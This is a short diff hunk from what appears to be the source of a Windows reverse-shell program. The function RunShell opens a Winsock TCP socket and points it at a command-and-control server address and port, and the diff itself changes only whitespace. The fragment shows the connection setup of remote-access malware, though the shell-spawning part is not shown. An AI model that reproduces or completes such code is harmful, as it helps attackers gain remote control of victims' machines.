@@ -16,7 +16,7 @@ void RunShell(char* C2Server, int C2Port) {
         WSAStartup(MAKEWORD(2,2), &version);
         mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
-   
+
         addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
         addr.sin_port = htons(C2Port);     //Port received from main function
 
